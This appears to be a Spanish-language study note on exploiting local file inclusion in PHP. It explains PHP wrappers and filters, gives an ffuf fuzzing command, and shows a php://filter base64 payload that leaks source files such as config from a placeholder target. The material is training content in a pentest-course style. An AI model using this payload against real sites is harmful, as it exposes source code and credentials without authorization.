
[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php): nos permiten acceder a diferentes flujos de E/S a nivel de aplicacion como:

- E/S estandar
- Descritores de archivos
- Flujos de memoria

Podemos usarlos para leer archivos de codigo fuente o incluso ejecutar comandos


## Filtros de entrada

[Filtros de PHP](https://www.php.net/manual/en/filters.php): nos permiten transformar los datos de un flujo o stream. Para usarlos podemos usar `php://` y podemos acceder a los wrapper de filtros PHP con `php://filter/`

`php://filter` tiene varios parametros pero los principales son:

- `resource`: obligatorio para los wrappers de filtro. Podemos especificar el flujo que nos gustraria aplicar (ejemplo: un archivo local)
- `read`: puede aplicar diferentes filtros al recurso de entrada

4 Tipos de filtros:

- [Filtros de Cadena](https://www.php.net/manual/en/filters.string.php)
- [Filtros de Conversión](https://www.php.net/manual/en/filters.convert.php),
- [Filtros de Compresión](https://www.php.net/manual/en/filters.compression.php) 
- [Filtros de Cifrado](https://www.php.net/manual/en/filters.encryption.php)


## Fuzzing de archivos PHP

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://IP:PORT/FUZZ.php
```

Deberiamos escanear no solo los 200 sino tambien los 301, 302 y 403 ya que tenemos LFI y deberiamos leer su codigo fuente

## Divulgacion de codigo fuente

Entonces trataremos de obtener el codigo fuente a traves del base64 con filtro PHP:

```
http://IP:PORT/index.php=PARAMETRO=php://filter/read=convert.base64-encode/resource=config
```

(La pagina añade las extension .php por defecto al final por lo que no la tenemos que añadir)

![[Pasted image 20260717234911.png]]


Copiamos el base64 y lo decodificamos en nuestra maquina:

```
echo 'BASE64' | base64 -d
```
